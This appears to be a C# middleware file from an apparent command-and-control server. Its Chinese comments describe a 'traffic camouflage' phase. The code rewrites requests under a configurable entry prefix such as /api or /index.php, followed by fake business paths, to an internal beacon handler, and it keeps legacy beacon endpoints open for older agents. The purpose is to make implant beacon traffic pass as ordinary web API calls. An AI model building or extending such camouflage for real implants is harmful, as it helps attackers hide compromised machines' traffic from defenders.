using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Middleware;

/// <summary>
/// 单入口路由（流量伪装 Phase 2）：
/// 把 profile 配置的入口前缀（如 /api、/index.php）及其后的任意虚假业务路径段
/// 重写到内部端点 /api/beacon/handle —— 服务端忽略入口之后的路径段
/// （/api/user/info、/api/orders/123 全部按 /api 前缀路由）。
///
/// 旧版 beacon 端点（/api/beacon/*）保持原样，兼容旧 agent。
/// </summary>
public class BeaconEntryMiddleware
{
    private readonly RequestDelegate _next;

    public BeaconEntryMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, ProfileService profileService)
    {
        var path = context.Request.Path.Value ?? "/";

        // 旧端点直接放行
        if (path.StartsWith("/api/beacon/", StringComparison.OrdinalIgnoreCase))
        {
            await _next(context);
            return;
        }

        var profile = await profileService.GetActiveProfileAsync();
        string entryPath;
        if (profile is Profiles.ConfigurableProfile cp)
        {
            entryPath = "/" + cp.Config.EntryPath.TrimStart('/');
        }
        else
        {
            entryPath = "/api"; // DefaultProfile 固定值
        }

        // 入口前缀命中（含精确匹配与 /entry/xxx 后缀）
        if (string.Equals(path, entryPath, StringComparison.OrdinalIgnoreCase) ||
            path.StartsWith(entryPath + "/", StringComparison.OrdinalIgnoreCase))
        {
            context.Request.Path = "/api/beacon/handle";
        }

        await _next(context);
    }
}
